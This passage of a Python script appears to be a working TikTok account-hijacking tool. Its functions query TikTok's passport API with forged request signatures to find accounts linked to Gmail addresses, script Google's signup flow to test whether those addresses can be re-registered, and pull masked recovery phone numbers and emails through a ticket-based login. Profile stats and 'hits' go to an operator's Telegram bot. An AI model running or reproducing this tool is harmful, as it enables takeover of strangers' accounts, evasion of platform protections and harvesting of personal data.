                             'User-Agent': 'com.zhiliaoapp.musically/2023208030 (Linux; U; Android 9; en; G011A; Build/PI;tt-ok/3.12.13.4-tiktok)',
                             'x-tt-passport-csrf-token': secret,
                             'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
                             'x-argus': mkk["x-argus"],
                             'x-gorgon': mkk["x-gorgon"],
                             'x-khronos': mkk["x-khronos"],
                             'x-ladon': mkk["x-ladon"],
    }
         
          	response = session.post("https://api22-normal-c-alisg.tiktokv.com/passport/email/bind_without_verify/",params=params, headers=headers, data={"email":email})
          	if "Email is linked to another account. Unlink or try another email" in response.text:          		
          		return True
          	else:
                  return False
          except Exception as e:''      


  def check_gmail(self,username):
      email = username     
      while True:
        try:   
          u = 'https://accounts.google.com/lifecycle/flows/signup?flowName=GlifWebSignIn&amp;flowEntry=SignUp&amp;dsh=S-2080027205%3A1708756695873425&amp;theme=glif'
          h = {
                'Host': 'accounts.google.com',
                'Cookie': f'__Host-GAPS=1:bJF6fwl6pi8dpEBJYhlgj-LilfRh9A:3QzueA6kta8qieh3',
                'Sec-Ch-Ua': '"Chromium";v="121", "Not A(Brand";v="99"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Full-Version': '""',
                'Sec-Ch-Ua-Arch': '""',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Ch-Ua-Platform-Version': '""',
                'Sec-Ch-Ua-Model': '""',
                'Sec-Ch-Ua-Bitness': '""',
                'Sec-Ch-Ua-Wow64': '?0',
                'Sec-Ch-Ua-Full-Version-List': '',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'X-Client-Data': 'CJPuygE=',
                'Sec-Fetch-Site': 'same-site',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Referer': 'https://support.google.com/',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9',
                'Priority': 'u=0, i'
            }
          ATAX = requests.get(u, headers=h).text
          at = ATAX.split('"SNlM0e":"')[1].split('",')[0]
          tl = ATAX.split('?flowName%3DGlifWebSignIn%26TL%3D')[2].split("',")[0]
          host = requests.get('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=V1UmUe&source-path=%2Fv3%2Fsignin%2Fidentifier&f.sid=9040880579683811499&bl=boq_identityfrontendauthuiserver_20240211.08_p0&hl=en-US&_reqid=343345&rt=c', headers={'Cookie': f'__Host-GAPS=1:Z7bv_bm_SFYF0xEj3AP2BTXVHdwr4w:b7ZMMlLrGhrrvUGa', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0', 'X-Goog-Ext-278367001-Jspb': '["GlifWebSignIn"]', 'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8'}).cookies.get_dict()['__Host-GAPS']
          h = {'Host': 'accounts.google.com', 'Cookie': f'__Host-GAPS={host}', 'Content-Length': '208', 'Sec-Ch-Ua': '"Not(A:Brand";v="24", "Chromium";v="122"', 'X-Goog-Ext-278367001-Jspb': '["GlifWebSignIn"]', 'X-Same-Domain': '1', 'X-Goog-Ext-391502476-Jspb': '["S-402181831:1712329129495995","mail"]', 'Sec-Ch-Ua-Mobile': '?0', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36', 'Sec-Ch-Ua-Arch': '""', 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8', 'Sec-Ch-Ua-Full-Version': '""', 'Sec-Ch-Ua-Platform-Version': '""', 'Sec-Ch-Ua-Full-Version-List': '', 'Sec-Ch-Ua-Bitness': '""', 'Sec-Ch-Ua-Model': '""', 'Sec-Ch-Ua-Wow64': '?0', 'Sec-Ch-Ua-Platform': '"Windows"', 'Accept': '*/*', 'Origin': 'https://accounts.google.com', 'X-Client-Data': 'CJPuygE=', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://accounts.google.com/', 'Priority': 'u=1, i'}
          u1 = f'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute?rpcids=ink9M&source-path=%2Flifecycle%2Fsteps%2Fsignup%2Fbirthdaygender&f.sid=6778458678089707255&bl=boq_identity-account-creation-evolution-ui_20240403.07_p0&hl=ar&TL={tl}&_reqid=364735&rt=c'
          ww = names.get_last_name()            

          d1 = f'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{ww}%5C%22%2C%5C%22%5C%22%2C0%2C%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2C0%2C1%2C%5C%22%5C%22%2Cnull%2Cnull%2C2%2C1%5D%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={at}&'
          r = requests.post(u1, headers=h, data=d1).text
          if 'birthdaygender' in r:
          	u2 = f'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute?rpcids=eOY7Bb&source-path=%2Flifecycle%2Fsteps%2Fsignup%2Fbirthdaygender&f.sid=6778458678089707255&bl=boq_identity-account-creation-evolution-ui_20240403.07_p0&hl=ar&TL={tl}&_reqid=464735&rt=c'
          	d2 = f'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B1996%2C4%2C1%5D%2C3%2Cnull%2C0%2C%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2C0%2C1%2C%5C%22%5C%22%2Cnull%2Cnull%2C2%2C1%5D%2C%5C%22%3CoGxqbDQCAAYWzUtINs2N3OZY2i2GvWL0ADQBEArZ1KjttJFc2s-CxI6lv_CEONfeEr22ysC-Kj8h-sITKjlfEA_F7RhqKRJzr5RucAz8zQAABHKdAAAAGKcBB7EAR42aaBczFMRSIYu8Q0Kcw5y1t915GDRyzjF8yksPO42yMWVIgD3JlaWVEX99afnbaqzE2ZSigQ7CWw_Hwj4E2dww7V4f2txUVgi40WYS4Eo96vUJqPY3SnLA6wYXxCBoXzvvL6718JrT-An8rOXkLCx6mIbhQyjKpwWV9zOKe9-G4WO4wp7UWHgiEAO0iLAolO4YJrr3CIaH8atnsUk0C8bLAjSUsguqPnG2H-sBLlmwEIHTGm45c0J-LzIs5MAMEhT3RtdRQQ3Ro5tSeOhOUTFNIRs4sclH4d4u1WzpMrlIWZKplMhHjqB2h-l7SFRrQglusRk40g1EbVFIud977oxTJ9-Oia18ZY0un6lh6FxiH2jdTj7FbUNVA2KP54Ean1YJwuHnICmTN69r7umzsrjTNlB0BiQhfSYJ_nsPqYqnWsVIA6N3mLATm6n6uGEgJQd7UcieqNiH0wicI2H-lF3cPON26luRlt5K3K-2JbD6DdZ3Y2eO4cjm8TW5Slz4JK0HFkmgP8tYHZRW5vTYUlqKBJ1EK05d7lmvMgGsU-9PQeqg_X9YF7wsiLI0b4Yu-fYS2G8RX0Kejt0oWTU8w3K7Z0rQoAGc991YmV_mCv0nqsyjgb_EPvWzmNyYxDZLPobr0f7_lMCjetZn0U-GTX2Jp0j0sKdvpa8oZVI453YjNXTI1Bmjcy7QtzuE188VG9iO9voj9KLSiHwX5PJQUWCMKvmRvmwLDcAnZ5LPfnERRWlvIhIGHMbX6PJOTdcqP--VwzF7bmVBiOkYCDz_fSgndB7O01-k6PCs4UbgEsFAtd-AZkxA4rsGyDtnR2gfyt5aEgf7cj85URGTqEzssrHrnj3qHR-VoqN7hp89_LN4PK2-GCWNSbn0pbRw0_901p9hCdfII-RXgCAdd1QmFED1QETCtC_ydrajDnG_-qca3o9TyxzNJ2x2u8U63taF6EE4O2EqgAqUpFazI9HnTKuv3Dv5GM_6cBrLvriRRMmfLwDryFiBpq9ySozjUYtT0azi6gyzEjyY944kNppkE2pTfxaB_0N6PEc0eb5DWKOrxYCGwaURd--jnRfwhmWuRVfpZD2_fPF-aQg-y5Q-2vrusIBc5uPrxD2OELbtz8QHlkTMd9BfSyClFbSUESJ6-v2sPikAsDQdDOkinjF_ltusi_LH1x_MIC1Z6XnKVoYBSYaoDxjp836tcbu2uve5tf-tQQUr_N-Ky4qP6h1JwpohYpV6j2pI745FXPxqwq4-q0E9l543B4q31owADbghsMSM_SVKtUm0w-Y-GCym1nx3kM5yv3Dplc2-Ocqk2_NHNgCBuWrO0SeAWj6car5XxcYPma892jwSkMw0crUK409bnP02tyWWeThNrYoihGj1-iwdFSU-ORgmmyxw7202CYmDH81XHs0PLIPVBoUL754sAKUnuXJMj_tZSf4zy84uoSgRaQEnkBEmIuLpzC-tDzeT6lDRHULoJOxmYS6ZZV_V1teGXJiFQ9DOn-Ak8PszwehMMzI98EQGKQduWjl94bTPpNJqY-cyKqv9qJp9c0c_BhiSmrJMkP0sAAfGiSxbouw1y9EtabhNfKH1WJg_4cCwBrWmv4_rS4OhpBi7gocgFib2HdqUDeYlcosF-fem6NQQ7OjDk4zDjpOQspogfY9EnV46CyhMkClll0M1F_yc1DfyDmRQJp3Ijp0NRtav2w41AlJaFM6LiBS67eG-th_utPR05fcLnmBWdqGMOPl7DsfujIg1bhnJxUOcHYCP7I0pwlc8Ldhl87GBQcEQmNgl9juFOsj4rcZZ8UdBRdT-9VhDomX6Cl3yGbS0dbanITD37TUhFp3hICgt5x1WGEF5p36VW5_PXTwFY2nGFXZJNyyHOZJcXhZNTTZtXNPZVJd1M_FCvfOKqj5Je698-tU-GslAt5nNXoHqYGMzC1enylH-ROSPJFJHnczWcRq9d3VgcYtBqKigFunvZDPWQu2U8Eozvp1gbqrCkO0Pr4MeJHcbY0ZDDCAxFjvAiSj-iKpbtBBcjdIv81x2ZB0xEafzJX-Kijuo1ivM7oQqxYasTqRfV7qJrewetbphRQEq8yDUINS4ddbhUl3Z_6-Aw4PaaDgqm-gXyMnDQ4I0fuKXmbvx8UYr1KAFdR-HDHoKTLEHqO-yKCf_S4dqV86p00aqsiyJ8WMkAK72ufl6hNrhoz_fcp86ayf1baqoqEEQUhH9Rd-mR34orLcBh9y38o1u3JejfHmGOaxEqtilP3qAeT4cnp2UUQhIXsAkmHYCpXvTqfETWEJdUS_c4-AwDmt2j1TNAJjCxit6YVG7P3BdysbGJEuYBZ7u6lNX2UlKdjMPFDK0e5PyhqytkvLnTUp_f4xUH9i2alspPEm2DYR4md1-yTZWpALTaTvChWjqRCCEm0gPRaH5VWrlnbhJ-MS3QGGL-FHoekY_fInHA8HBriTW0xlaV6OjM9ykUWZ0kT4zL64iGoujS7w51sOuehv5aRG2ZQ-4fGmdkWlQmH1Mqd0LslIN6t8YbFUQ3vvbW30JjZoqKUQTrtM7DN4vPxvmGrkuUOHa1n8jYtnfC_pu6R_ab702buqGGUozEI_tF92PVZbgNA7X8xCU9tFStpnJ5cC-a8l0fOXZ4Do90JaWMqLHKx2PThWgNsYB4TIvBlURvCd2fAg9yviNbvNMo3f2idcbY5LjRnHxqweE_zibEn_DWivRdVOCMAdxU9Cb49p9-7lJJRBOSrb4jKsfFIZxjyBhxq4lA0NzUkZ5nivPtz2XbJhkI9aocw2HOMVz2BTIC18VkDbkMbiKFmtXC9fpwag7bFCsA6bAxWNs_eM07XW44q8zdC01zsnZ8nvbDk8AYAbFVSspwqO34thjfAHSskyTZO_-owOrhqeKs0BuFpZ_TbQicDtuf9AdftxvkQhiQ547bklgoZDvpNxLHwzMjw2VSVKCLC66EN3dMPsiJvH02RE-q8aG2sx2G6JJuNGCBLJlqS1uvTToq9ApzLOwO7zcn8HoIBj5aXLNQqVijP1pP9WSXSHRe-JzCYX9TezRbH1sbFkchVXYW1OJXP_5%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={at}&'
          	r = requests.post(u2, headers=h, data=d2).text
         
          	if 'steps/signup/username' in r:
          	 	u = f'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute?rpcids=NHJMOd&source-path=%2Flifecycle%2Fsteps%2Fsignup%2Fusername&f.sid=6778458678089707255&bl=boq_identity-account-creation-evolution-ui_20240403.07_p0&TL={tl}&_reqid=664735&rt=c'
          	 	d = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{email}%5C%22%2C1%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C0%2C7681%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={at}&'
          	 	r = requests.post(u, headers=h, data=d).text         
          	 	if 'password' in r:
          	 		return True
          	 	else:
          	 		return False

        except Exception as e:''

          
  def rest(self,username):
      try:
        secret = secrets.token_hex(16)
        cookies ={
      "passport_csrf_token": secret,
      "passport_csrf_token_default": secret
    }
        session = requests.Session()
        session.cookies.update(cookies)
        url = "https://api22-normal-c-alisg.tiktokv.com/passport/account_lookup/username/"
        params = {
      "request_tag_from": "h5",
      "fixed_mix_mode": "1",
      "mix_mode": "1",
      "account_param":username,
      "scene": "4",
      "device_platform": "android",
      "os": "android",
      "ssmix": "a",
          '_rticket': str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632",
        'cdid': str(uuid.uuid4()),
      "channel": "googleplay",
      "aid": "1233",
      "app_name": "musical_ly",
      "version_code": "360505",
      "version_name": "36.5.5",
      "manifest_version_code": "2023605050",
      "update_version_code": "2023605050",
      "ab_version": "36.5.5",
      "resolution": "1440*2969",
      "dpi": "532",
      "device_type": "SM-S928B",
      "device_brand": "samsung",
      "language": "EN",
      "os_api": "34",
      "os_version": "14",
      "ac": "wifi",
      "is_pad": "0",
      "current_region": "US",
      "app_type": "normal",
      "sys_region": "US",
      "last_install_time": "1729289943",
      "mcc_mnc": "41820",
      "timezone_name": "Asia/Baghdad",
      "carrier_region_v2": "418",
      "residence": "US",
      "app_language": "en",
      "carrier_region": "US",
      "timezone_offset": "10800",
      "host_abi": "arm64-v8a",
      "locale": "ar",
      "ac2": "wifi",
      "uoo": "0",
      "op_region": "US",
      "build_number": "36.5.5",
      "region": "US",
      'ts': str(round(random.uniform(1.2, 1.6) * 100000000) * -1),
        'iid': str(random.randint(1, 10**19)),
        'device_id': str(random.randint(1, 10**19)),
        'openudid': str(binascii.hexlify(os.urandom(8)).decode()),

      "support_webview": "1",
      "cronet_version": "1c651b66_2024-08-30",
      "ttnet_version": "4.2.195.8-tiktok",
      "use_store_region_cookie": "1"
    }
        ms = sign(params=urlencode(params), payload="", cookie="")
        headers = {
      'User-Agent': "com.zhiliaoapp.musically/2023605050 (Linux; U; Android 14; ar; SM-S928B; Build/UP1A.231005.007; Cronet/TTNetVersion:1c651b66 2024-08-30 QuicVersion:182d68c8 2024-05-28)",
      'Accept': "application/json, text/plain, */*",
      'x-tt-passport-csrf-token': secret,
      'content-type': "application/x-www-form-urlencoded",
      'x-argus': ms["x-argus"],  'x-gorgon':ms["x-gorgon"],'x-khronos': ms["x-khronos"],'x-ladon':ms["x-ladon"],
    }
        response = session.post(url, params=params, headers=headers)
        passport_ticket = response.json()["data"]["accounts"][0]["passport_ticket"]
        url = "https://api22-normal-c-alisg.tiktokv.com/passport/user/login_by_passport_ticket/"
        for key in ['mix_mode', 'account_param', 'fixed_mix_mode']:
          params.pop(key, None)
        params['passport_ticket'] = passport_ticket
        response = session.post(url, params=params, headers=headers)
        hh=json.loads(response.headers["x-tt-verify-idv-decision-conf"])
        contact_info = {'number': '', 'email': ''}
        for en in hh.get('extra', []):
        	masked_account = en.get('masked_account', '')
        	if '+' in masked_account:
        		contact_info['number'] = masked_account
        	elif '@' in masked_account:
        		contact_info['email'] = masked_account	
        return contact_info		
      except Exception as e:
         return {'number':'?', 'email': '?'}
         
  def info(self,username):
  	rest = self.rest(username)  	
  	try:
  		headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0'}
  		url = f'https://www.tiktok.com/@{username}'
  		
  		json_data = {'query': f'{{Property{{liveScreenshot(address: "{url}"){{width height hash}}}}}}'}
  		response = requests.post('https://api.hexometer.com/v2/ql', json=json_data)
  		response_data = response.json()
  		if 'data' in response_data and 'Property' in response_data['data']:
  		 	image_hash = response_data['data']['Property']['liveScreenshot']['hash']
  		 	img = f"https://fullpagescreencapture.com/screen/{image_hash}.jpg"
  		 	tiktok_response = requests.get(f'https://www.tiktok.com/@{username}', headers=headers).text
  		 	name = tiktok_response.split('nickname":"')[1].split(',')[0]
  		 	followers = tiktok_response.split('"followerCount":')[1].split(',')[0]
  		 	user_id = tiktok_response.split('"id":"')[1].split('"')[0]
  		 	following = tiktok_response.split('"followingCount":')[1].split(',')[0]
  		 	region = tiktok_response.split('"region":"')[1].split('"')[0]
  		 	likes = tiktok_response.split('"heartCount":')[1].split(',')[0]  		 
  		 	text = f'''  		 	
|•>Name : {name}
|•>Email : {username}@gmail.com
|•>Followers : {followers}
|•>Following : {following}
|•>Region : {region}
|•>Likes : {likes}
|•>Rest : {rest}
                    '''
  		 	bot = telebot.TeleBot(self.tok)
  		 	bot.send_photo(self.id, photo=img, caption=text)
  		 	
  	except Exception as e:
  		requests.post(f"https://api.telegram.org/bot{self.tok}/sendMessage?chat_id={self.id}&text={username}@gmail.com") 
  def list(self):
  	os.system('clear' if os.name == 'posix' else 'cls')
  	print(f"{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
  	print(B + f"""      
 {J22}⚙ {P1}Powerful Tool {J22}⚙                       
 {J22}⚙ {P1}Author :  {J22}⚙             
 {J22}⚙ {P1}Version: 2.6 {J22}⚙            
    """)
  	print(f"{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
  	print(f'{X}[{O}1{X}] Followers  - {X}[{O}2{X}] Following')
  	print('')
  	hh = input(f' {J}Selet : ')
  	if hh =='1':
  		self.main_followers()
  	elif hh =='2':
  		self.main_following()
  	else:
  		exit('')
 	
    
    		
  def hh(self):
  	print(f"{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
  	print(B + f"""      
 {J22}⚙ {P1}Powerful Tool {J22}⚙                       
 {J22}⚙ {P1}Author :  {J22}⚙             
 {J22}⚙ {P1}Version: 2.6 {J22}⚙            
    """);print(f"{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬");print('');  	
  	print(f'{X}[{C1}1{X}] {Pk}Random ')
  	print(f'{X}[{C1}2{X}] {Pk}List')
  	print(f'{X}[{C1}3{X}] {Pk}Check_List')
  	print(f'{X}[{C1}4{X}] {Pk}delete_List')
  	print('')
  	kk = input('Selet : ')
  	os.system('clear' if os.name == 'posix' else 'cls')
  	if kk =='1':
  		threads = []
  		thread = Thread(target=self.search1)
  		threads.append(thread)
  		thread.start()
  	elif kk =='2':
  		self.list()
  	elif kk =='3':
  		self.check()
  	elif kk =='4':
  		self.delet()
  	else:
  		exit()
 		
  def mainn(self,username):   	
  	while True:
  		try:			
  			sys.stdout.write(f"\rHits: {self.good2}| Bad TikTok: {self.bad1} | Bad Gmail: {self.bad2} | Good TikTok: {self.good1}\r")
  			sys.stdout.flush()
  			email = username+'@gmail.com'
  			if self.check2(email)==True:  				
  				self.good1+=1
  				if self.check_gmail(username)==True:
  					self.good2+=1
  					self.info(username)
  				else:
  					self.bad2+=1			
  			else:
  				self.bad1+=1
  		except Exception as e:'' 
  		
bb = tiktok()
bb.hh()